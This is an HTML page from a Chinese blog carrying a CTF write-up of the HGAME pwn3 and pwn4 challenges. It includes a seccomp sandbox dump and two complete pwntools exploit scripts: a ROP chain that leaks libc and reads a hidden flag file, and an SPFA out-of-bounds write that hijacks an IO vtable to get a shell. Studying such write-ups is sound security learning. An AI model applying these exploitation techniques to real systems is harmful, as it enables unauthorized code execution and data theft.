@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="HGAME—-PWN感觉题目质量挺高的，目前就做了pwn1,pwn3,pwn4.pwn1是一个简单的栈溢出，重点记录一下pwn3和pwn4的攻击思路，因为是我第一次见到这种思路。（全程被ayoung和mark带） pwn3题目提示反弹不了shell而且存flag的文件不叫flag,所以不能用传统的orw的rop来得到flag,沙盒里也禁用了一些函数 123456789101112131415161">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME">
+<meta property="og:url" content="http://example.com/2022/01/22/HGAME/index.html">
+<meta property="og:site_name" content="study">
+<meta property="og:description" content="HGAME—-PWN感觉题目质量挺高的，目前就做了pwn1,pwn3,pwn4.pwn1是一个简单的栈溢出，重点记录一下pwn3和pwn4的攻击思路，因为是我第一次见到这种思路。（全程被ayoung和mark带） pwn3题目提示反弹不了shell而且存flag的文件不叫flag,所以不能用传统的orw的rop来得到flag,沙盒里也禁用了一些函数 123456789101112131415161">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-22T13:10:53.000Z">
+<meta property="article:modified_time" content="2022-01-22T13:11:07.651Z">
+<meta property="article:author" content="rootzhang">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/01/22/HGAME/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HGAME | study</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">study</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/HGAME/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HGAME
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-22 21:10:53 / 修改时间：21:11:07" itemprop="dateCreated datePublished" datetime="2022-01-22T21:10:53+08:00">2022-01-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HGAME—-PWN"><a href="#HGAME—-PWN" class="headerlink" title="HGAME—-PWN"></a>HGAME—-PWN</h1><p>感觉题目质量挺高的，目前就做了pwn1,pwn3,pwn4.pwn1是一个简单的栈溢出，重点记录一下pwn3和pwn4的攻击思路，因为是我第一次见到这种思路。（全程被ayoung和mark带）</p>
+<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>题目提示反弹不了shell而且存flag的文件不叫flag,所以不能用传统的orw的rop来得到flag,沙盒里也禁用了一些函数</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/get-shell/hgame/pwn3/to_give_out$ seccomp-tools dump ./vuln</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>有些沙盒是白名单，有些沙盒是黑名单，这个就是黑名单，可以看出禁用了execve函数不能反弹shell.</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>不能弹shell的话就得用orw来读flag,用orw的话得先知道对面文件名才行，mark提示说用getdents函数得到文件名再用orw得到flag,getdents函数的完整攻击思路是ogw,意即用open打开文件夹，用getdents函数把文件名在写程序里，然后用write函数写出来，这是调用他们时的参数构造</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;./&#x27;</span>,<span class="number">0x1000</span>,<span class="number">0</span>)</span><br><span class="line">getdents(句柄（<span class="number">0</span>）,地址，<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br><span class="line">write(<span class="number">1</span>,地址，<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br></pre></td></tr></table></figure>
+
+<p>先通过rop调用ogw得到flag文件名，然后调用orw读flag</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x0000000000401443: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401441: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000040143d: pop rsp; pop r13; pop r14; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x00000000004013DC&#x27;)</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401441</span></span><br><span class="line">main=<span class="number">0x401311</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line">libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(syscall_addr)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(execve_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#sh.send(&#x27;./\x00&#x27;)</span></span><br><span class="line">sh.send(<span class="string">&#x27;flagd44b02e91a1d1648cbfc\x00&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)</span><br><span class="line">payload+=p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_addr)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#hgame&#123;1-4dm1T~The-rop-ChA!N-M4YBE~TOoO0oooO0-l0Ng_And~$Orry_fOR_ThE~|Nc0NVenIENCE:(&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉构造rop的挺好玩的</p>
+<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>程序就是spfa算法的实现，刚开始我就分析出思路了，就是利用dist进行任意读和任意写，本来打算是利用exit_hook拿shell的，改是能改成功，但是改成功后程序就异常退出了，他也不调用exit-hook啊，实现+调试+发现错误+定位错误就用了一天，晚上十二点多是在受不了就问了ayoung,他告诉我改写io虚表指针，我哪知道这是啥啊，第一次听，但是改io指针肯定是通过printf或者scanf实现的，我就进行慢慢调试程序，还真被我发现一些虚表了，mark利用io_file_jumps出了，我利用io_helper_jumps出了（四点出的）</p>
+<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">47250</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./spfa&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&quot;b main&quot;)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many datas?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2275</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    dist_addr=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-<span class="number">8</span>+<span class="number">0x4720</span></span><br><span class="line">    elf_base=dist_addr-<span class="number">0x4720</span>-<span class="number">0x7000</span></span><br><span class="line">    bss_addr=dist_addr-<span class="number">0x4720</span></span><br><span class="line">    dock_addr=elf_base+<span class="number">0x16A5</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(bss_addr)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2272</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])</span><br><span class="line">    <span class="comment">#io=libc_base+0x1ec8a0+0x38</span></span><br><span class="line">    io=libc_base+libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]+<span class="number">0x28</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(io)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>((io-dist_addr)/<span class="number">8</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(dock_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many nodes?\n&gt;&gt; &#x27;,&#x27;2&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many edges?\n&gt;&gt; &#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(1))</span></span><br><span class="line">    <span class="comment"># sh.sendline(&#x27;-2217&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(bss_addr+0x100+0xd8+0x38))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;you want to start from which node?\n&gt;&gt; &#x27;,str(0x10))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,str(-2272))</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>调试程序越来越熟练了，通过调试printf函数的执行过程也直观了解了虚表的作用，以后能任意写除了got表和exit，还能改写虚表拿shell了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/20/sctf2021-gadget/" rel="prev" title="sctf2021 gadget">
+      <i class="fa fa-chevron-left"></i> sctf2021 gadget
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HGAME%E2%80%94-PWN"><span class="nav-number">1.</span> <span class="nav-text">HGAME—-PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn3"><span class="nav-number">1.1.</span> <span class="nav-text">pwn3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.1.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">1.1.2.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn4"><span class="nav-number">1.2.</span> <span 